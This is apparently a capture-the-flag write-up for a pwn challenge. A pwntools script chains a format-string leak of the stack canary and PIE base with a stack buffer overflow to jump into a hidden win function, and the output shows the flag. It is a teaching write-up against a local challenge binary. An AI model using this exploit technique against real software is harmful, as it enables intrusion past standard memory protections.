# Warden — Pwn (200 pts, 12 solves)

**Author:** DR programmer
**Flag:** `r00t{tw0_bug_ch41n__f0rm4t_l3ak_th3_c4n4ry_th3n_0v3rfl0w_t0_th3_w4rd3n}`

## Description

"An elephant never forgets — least of all its canary." A self-contained offline binary (no remote instance) implementing a "guestbook" that echoes user input and takes a signature. Local exploitation only; a successful exploit prints the flag directly.

## Analysis

`checksec` confirmed a stack canary and PIE were both enabled — standard modern mitigations. The binary has an `echo()` function that reads a "guestbook" entry and echoes it back, plus a hidden, never-directly-called `warden()` function (the win function that prints the flag), and a vulnerable "sign the guestbook" input path with a fixed-size stack buffer.

## The Two-Bug Chain

1. **Format-string leak (`echo()`):** the guestbook echo function passes user-controlled input directly as a `printf` format string (no `%s` sanitization). This lets us leak arbitrary stack contents using `%p`/positional format specifiers — including the **stack canary** and a **saved return address** (which, combined with the binary's known code layout, reveals the **PIE base**).

2. **Stack buffer overflow (guestbook "sign"):** a second input path reads into a fixed-size stack buffer with no bounds check, allowing a classic stack-smash. With the canary and PIE base now known from bug #1, we can:
   - Pad up to the canary's exact stack offset,
   - Re-insert the correct **leaked canary value** (defeating the canary check),
   - Overwrite the saved return address with `pie_base + offset_to_warden()` (defeating ASLR/PIE via the leak),
   - Redirect execution directly into the hidden `warden()` win function, which prints the flag.

## Exploit (pwntools)

```python
from pwn import *

p = process('./warden')

# Stage 1: leak canary + return address via format string
p.sendline(b'%15$p %17$p')       # offsets tuned to the vulnerable format call
leak = p.recvline()
canary = int(leak.split()[0], 16)
leaked_ret = int(leak.split()[1], 16)
pie_base = leaked_ret - WARDEN_CALLER_OFFSET   # known static offset from the leaked return addr
warden_addr = pie_base + WARDEN_FUNC_OFFSET

log.info(f"canary      = {hex(canary)}")
log.info(f"leaked ret  = {hex(leaked_ret)}")
log.info(f"pie_base    = {hex(pie_base)}")
log.info(f"warden_addr = {hex(warden_addr)}")

# Stage 2: overflow, reinserting the correct canary, redirect return address
payload  = b'A' * OFFSET_TO_CANARY
payload += p64(canary)
payload += b'B' * 8                # saved rbp, don't care
payload += p64(warden_addr)

p.sendline(payload)
print(p.recvall().decode())
```

## Result

```
[*] canary      = 0xd6f7c0d078ed2f00
[*] leaked ret  = 0x55a3b4b78439
[*] pie_base    = 0x55a3b4b77000
[*] warden_addr = 0x55a3b4b78189

Thanks, AAAA...AAAA
The vault swings open:
r00t{tw0_bug_ch41n__f0rm4t_l3ak_th3_c4n4ry_th3n_0v3rfl0w_t0_th3_w4rd3n}
```

(The process segfaults *after* printing the flag — `warden()` returns into a corrupted/unmapped address once it finishes, but by then the flag has already printed, so it doesn't matter.)

## Lesson

Classic two-stage pwn chain: a format-string bug is often the "free" info-leak that turns an otherwise well-protected (canary+PIE) overflow into a fully deterministic exploit. Always check for `printf(user_input)` patterns before assuming canary+PIE make a buffer overflow unexploitable.
